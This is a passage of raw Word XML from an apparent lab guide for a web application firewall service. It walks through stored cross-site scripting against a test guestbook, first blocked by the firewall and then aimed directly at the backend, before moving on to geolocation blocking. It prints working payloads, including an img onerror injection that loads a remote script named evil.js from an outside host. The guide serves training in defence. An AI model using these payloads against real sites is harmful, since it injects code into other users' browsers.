          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>('script');s.src='</w:t>
      </w:r>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:eastAsia="Calibri" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s)</w:t>
      </w:r>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D64596" w14:textId="77777777" w:rsidR="00044F20" w:rsidRDefault="44F2A4C5" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">This will be blocked by the </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18" w:rsidRPr="55E0BB2E">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r w:rsidR="008C2437" w:rsidRPr="55E0BB2E">
        <w:t>before and</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> is never seen by the web server.</w:t>
      </w:r>
      <w:r w:rsidR="60B340DA" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C30D9BF" w14:textId="0C375AF7" w:rsidR="00B35D5D" w:rsidRDefault="00044F20" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>You can view the details of this attack in the Firewall logs.</w:t>
      </w:r>
      <w:r w:rsidR="60B340DA" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC2A8F1" w14:textId="17DCBC01" w:rsidR="00B35D5D" w:rsidRDefault="00B35D5D" w:rsidP="00172641"/>
    <w:p w14:paraId="61C9F7A9" w14:textId="169C3A40" w:rsidR="000E572F" w:rsidRDefault="00B35D5D" w:rsidP="00172641">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1587C0D8" w14:textId="754BA04E" w:rsidR="000E572F" w:rsidRDefault="00D5628E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="58" w:name="_Toc72791973"/>
      <w:bookmarkStart w:id="59" w:name="_Toc85937349"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Confirming</w:t>
      </w:r>
      <w:r w:rsidR="03240913">
        <w:t xml:space="preserve"> a Cross-Site Scripting vulnerability</w:t>
      </w:r>
      <w:bookmarkEnd w:id="58"/>
      <w:r w:rsidR="03240913">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="59"/>
    </w:p>
    <w:p w14:paraId="220D727B" w14:textId="23614F31" w:rsidR="000E572F" w:rsidRDefault="24B6582C" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">Now we will go directly to our </w:t>
      </w:r>
      <w:r w:rsidR="121891DE">
        <w:t>Backend S</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">erver and repeat the same XSS attacks to verify they exist.  </w:t>
      </w:r>
      <w:r w:rsidR="7DB38AEE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="7DB38AEE">
        <w:t xml:space="preserve"> will not see the attacks and </w:t>
      </w:r>
      <w:r w:rsidR="45C0F5A0">
        <w:t xml:space="preserve">will not </w:t>
      </w:r>
      <w:r w:rsidR="7DB38AEE">
        <w:t xml:space="preserve">block them. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F8BF23" w14:textId="5AC835B7" w:rsidR="000E572F" w:rsidRDefault="00232A20" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Browse</w:t>
      </w:r>
      <w:r w:rsidR="03240913">
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="4D54E7FE">
        <w:t xml:space="preserve">your </w:t>
      </w:r>
      <w:r w:rsidR="4D54E7FE" w:rsidRPr="00232A20">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Backend Server URL</w:t>
      </w:r>
      <w:r w:rsidR="4D54E7FE">
        <w:t xml:space="preserve"> (not your </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="007B3BC3">
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="4D54E7FE">
        <w:t xml:space="preserve"> )</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="4D54E7FE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3633FD01" w14:textId="3046C28F" w:rsidR="000E572F" w:rsidRDefault="00B35D5D" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Click on Sign Guestbook, and </w:t>
      </w:r>
      <w:r w:rsidR="64381C61" w:rsidRPr="55E0BB2E">
        <w:t>enter this comment</w:t>
      </w:r>
      <w:r w:rsidR="7749D716" w:rsidRPr="55E0BB2E">
        <w:t>, being careful to use single quotes as shown.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC7061D" w14:textId="5547939F" w:rsidR="7749D716" w:rsidRPr="00422A5A" w:rsidRDefault="7749D716" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00422A5A">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00422A5A">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00422A5A">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>'go to terriblestore.com for lower prices!');&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A3732F" w14:textId="39E69295" w:rsidR="001E79D3" w:rsidRPr="00B45D15" w:rsidRDefault="7749D716" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You will see a pop-up with the </w:t>
      </w:r>
      <w:r w:rsidR="008C2437">
        <w:t xml:space="preserve">advertising </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:r w:rsidR="00422A5A">
        <w:t xml:space="preserve">a competing </w:t>
      </w:r>
      <w:r>
        <w:t>site, luring your customers away</w:t>
      </w:r>
      <w:r w:rsidR="00B45D15">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00E06847">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="11AD476E" wp14:editId="5B013117">
            <wp:extent cx="4303682" cy="728315"/>
            <wp:effectExtent l="0" t="0" r="1905" b="0"/>
            <wp:docPr id="1449851367" name="Picture 144985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03682" cy="728315"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D44E8F0" w14:textId="771737E6" w:rsidR="008E239E" w:rsidRDefault="007708D2" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="50C40F79">
        <w:t>Whil</w:t>
      </w:r>
      <w:r w:rsidR="041703DF" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidR="00B45D15">
        <w:t>simple</w:t>
      </w:r>
      <w:r w:rsidR="041703DF" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">, this </w:t>
      </w:r>
      <w:r w:rsidR="00B837DE" w:rsidRPr="50C40F79">
        <w:t>type of stored XSS</w:t>
      </w:r>
      <w:r w:rsidR="31252619" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve"> that can be thought of as an </w:t>
      </w:r>
      <w:r w:rsidR="00B837DE" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">advertising fraud type attack </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEAD71C" w14:textId="0FB84E71" w:rsidR="008E239E" w:rsidRDefault="00F4214D" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="57207BD1" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">ry </w:t>
      </w:r>
      <w:r w:rsidR="008E239E" w:rsidRPr="50C40F79">
        <w:t>leaving another comment</w:t>
      </w:r>
      <w:r w:rsidR="00315A76">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="1E126F60" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">You will see the same </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A34C4A" w:rsidRPr="50C40F79">
        <w:t>Terriblestore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A34C4A" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve"> advertising pop-up again</w:t>
      </w:r>
      <w:r w:rsidR="00BC3D2F" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00315A76">
        <w:t>and e</w:t>
      </w:r>
      <w:r>
        <w:t>veryone who leave</w:t>
      </w:r>
      <w:r w:rsidR="000F5464">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a comment will see this</w:t>
      </w:r>
      <w:r w:rsidR="000F5464">
        <w:t xml:space="preserve"> store</w:t>
      </w:r>
      <w:r w:rsidR="00315A76">
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="000F5464">
        <w:t xml:space="preserve"> XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3E78DB" w14:textId="0644B3E6" w:rsidR="00C17254" w:rsidRDefault="4005B373" w:rsidP="000F5464">
      <w:r w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">Now to do a more </w:t>
      </w:r>
      <w:r w:rsidR="00315A76">
        <w:t xml:space="preserve">interesting </w:t>
      </w:r>
      <w:r w:rsidRPr="50C40F79">
        <w:t>XSS attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692A44B5" w14:textId="120EE63B" w:rsidR="00C17254" w:rsidRDefault="007045EA" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="50C40F79">
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="0044252F" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">lick on Sign Guestbook </w:t>
      </w:r>
      <w:r w:rsidR="40366BE6" w:rsidRPr="50C40F79">
        <w:t>again</w:t>
      </w:r>
      <w:r w:rsidR="00315A76">
        <w:t xml:space="preserve">, then </w:t>
      </w:r>
      <w:r w:rsidR="40366BE6" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">Enter your name and email </w:t>
      </w:r>
      <w:r w:rsidR="00061193" w:rsidRPr="50C40F79">
        <w:t>as before, but this time put th</w:t>
      </w:r>
      <w:r w:rsidR="00866220" w:rsidRPr="50C40F79">
        <w:t>e following</w:t>
      </w:r>
      <w:r w:rsidR="00061193" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00196D8F">
        <w:t xml:space="preserve">exact text for </w:t>
      </w:r>
      <w:r w:rsidR="00061193" w:rsidRPr="50C40F79">
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00196D8F">
        <w:t xml:space="preserve"> comment</w:t>
      </w:r>
      <w:r w:rsidR="009479C9" w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r w:rsidR="00315A76">
        <w:t>Copy and paste is recommended.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54BED81B" w14:textId="1EE6B019" w:rsidR="00061193" w:rsidRPr="007023D5" w:rsidRDefault="00061193" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t>=1 onerror="s=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t>document.createElement</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t>('script');s.src='</w:t>
      </w:r>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Calibri" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t>//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s)</w:t>
      </w:r>
      <w:r w:rsidRPr="007023D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
        <w:t>;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6326A90E" w14:textId="1569F16E" w:rsidR="007045EA" w:rsidRDefault="008A0072" w:rsidP="00172641">
      <w:r>
        <w:t>If the attack worked, y</w:t>
      </w:r>
      <w:r w:rsidR="005F3A21" w:rsidRPr="55E0BB2E">
        <w:t>ou should get a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n eye-catching </w:t>
      </w:r>
      <w:r w:rsidR="009479C9" w:rsidRPr="55E0BB2E">
        <w:t>result</w:t>
      </w:r>
      <w:r w:rsidR="14550C1C" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> demonstrating </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">an example of the negative </w:t>
      </w:r>
      <w:r w:rsidR="436FFFC2" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">effect </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="436FFFC2" w:rsidRPr="55E0BB2E">
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="436FFFC2" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> XSS </w:t>
      </w:r>
      <w:r w:rsidR="14550C1C" w:rsidRPr="55E0BB2E">
        <w:t>attack</w:t>
      </w:r>
      <w:r w:rsidR="5FD94770" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> can have on your user experience.</w:t>
      </w:r>
      <w:r w:rsidR="00B54E5D">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="005026F2">
        <w:t xml:space="preserve">Go </w:t>
      </w:r>
      <w:r w:rsidR="005026F2" w:rsidRPr="005026F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>back</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1F6E04" w14:textId="1D0A601A" w:rsidR="004A3C9E" w:rsidRDefault="009C0D9F" w:rsidP="00D472CF">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C7E1C42" wp14:editId="5C2E0369">
            <wp:extent cx="3551685" cy="2424125"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851368" name="Picture 144985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51685" cy="2424125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F60801" w14:textId="77777777" w:rsidR="005F3A21" w:rsidRDefault="005F3A21" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3950A76D" w14:textId="6075C911" w:rsidR="00F90E1A" w:rsidRDefault="00D5628E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="60" w:name="_Toc363077954"/>
      <w:bookmarkStart w:id="61" w:name="_Toc72791974"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Venturing b</w:t>
      </w:r>
      <w:r w:rsidR="00F90E1A">
        <w:t>eyond the OWASP Top 10</w:t>
      </w:r>
      <w:bookmarkEnd w:id="60"/>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w14:paraId="3D304543" w14:textId="0BE99C94" w:rsidR="0000459B" w:rsidRDefault="005F3A21" w:rsidP="00172641">
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00F96BE0">
        <w:t xml:space="preserve">pplication </w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00F96BE0">
        <w:t xml:space="preserve">ecurity </w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t xml:space="preserve">requirements go </w:t>
      </w:r>
      <w:r w:rsidR="00F90E1A">
        <w:t xml:space="preserve">further </w:t>
      </w:r>
      <w:r w:rsidR="00BB1043">
        <w:t xml:space="preserve">than </w:t>
      </w:r>
      <w:r w:rsidR="00F63ABA">
        <w:t xml:space="preserve">SQL Injection and XSS and the </w:t>
      </w:r>
      <w:r w:rsidR="00BB1043">
        <w:t>OWASP Top 10</w:t>
      </w:r>
      <w:r w:rsidR="00F63ABA">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t xml:space="preserve">  In this lesson we will add more WAF-as-a-Service components to our security policy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EA3723" w14:textId="36F25407" w:rsidR="699639B3" w:rsidRDefault="003972D7" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="SimSun" w:hAnsi="Cambria" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="_Toc1204947969"/>
      <w:bookmarkStart w:id="63" w:name="_Toc72791975"/>
      <w:r>
        <w:t>Geolocation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="62"/>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="59E1BC4A" w14:textId="1BA98F80" w:rsidR="00605DE7" w:rsidRDefault="7B01683B" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:t>We</w:t>
      </w:r>
      <w:r w:rsidR="007D01EA">
        <w:t xml:space="preserve"> only do business with US and UK. Can you block all other countries? </w:t>
      </w:r>
      <w:r w:rsidR="025AA802">
        <w:t>We</w:t>
      </w:r>
      <w:r w:rsidR="007D01EA">
        <w:t xml:space="preserve"> also want to block TOR nodes and anonymous proxies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E55DA3" w14:textId="44A0A475" w:rsidR="007D01EA" w:rsidRPr="00605DE7" w:rsidRDefault="167977B5" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">Click on Add Components </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="47789FE5" wp14:editId="03D89369">
            <wp:extent cx="1411941" cy="291353"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2083335323" name="Picture 208333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335323"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId48">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1411941" cy="291353"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDB2B4A" w14:textId="486025CD" w:rsidR="007D01EA" w:rsidRPr="00605DE7" w:rsidRDefault="7A98A0B1" w:rsidP="00172641">
      <w:r>
        <w:t>Look</w:t>
      </w:r>
      <w:r w:rsidR="15E0CB9B">
        <w:t xml:space="preserve"> at the available components in </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="15E0CB9B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B2651A">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="15E0CB9B">
        <w:t>block web requests outside of the US and UK.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BE37B5" w14:textId="6A4EAB27" w:rsidR="007D01EA" w:rsidRDefault="4CC690B1" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Scroll down to find the </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>IP Address Geolocation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> component, and click Add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C6D1E2" w14:textId="52608122" w:rsidR="1586DAB5" w:rsidRDefault="1586DAB5" w:rsidP="00172641">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="19A91872" wp14:editId="06AE99B2">
            <wp:extent cx="4791145" cy="2124075"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="420279602" name="Picture 42027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79602"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId49">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4791145" cy="2124075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C811E27" w14:textId="115E4D71" w:rsidR="007D01EA" w:rsidRDefault="00A80AB6" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click the double arrow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
